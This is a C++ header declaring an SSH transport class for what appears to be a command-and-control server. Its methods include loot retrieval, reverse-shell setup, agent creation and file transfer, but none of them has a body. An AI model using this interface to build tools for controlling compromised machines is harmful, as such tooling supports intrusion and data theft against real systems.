#pragma once

#include "transport.h"
#include "list.h"
#include "log.h"
#include "b64.h"
#include "agents.h"

#ifndef KEYS_FOLDER
#ifdef _WIN32
#define KEYS_FOLDER
#else
#define KEYS_FOLDER "/etc/ssh/"
#endif
#endif


class Ssh_Transport: public ServerTransport
{
private:
    class Log *logger;
    class List *list;
    pClientNode node;
    ssh_bind sshbind;
    ssh_session session;
    ssh_channel channel;

    pClientNode authenticate();
public:
    Ssh_Transport(class Log *logger, class List *list, pClientNode node);
    //Ssh_Transport(class Log *logger, class List *list, _clientNode *node);
    ~Ssh_Transport();

    // generic protocol handlers
    int send_ok() override;
    int send_err() override;
    int listen(int socket) override;
    int read(char **buff) override;

    int determine_handler() override;
    int upload_file(char *ptr, int is_module) override;
    int download_file(char *ptr, int is_manager, char *extra) override;
    int get_loot(char *loot) override;
    int get_info(char *ptr) override;
    int handle(void *sess) override;
    void make_agent(char *dat_ptr, char *d_ptr) override;
    int init_reverse_shell() override;
    pClientNode get_node() override;
};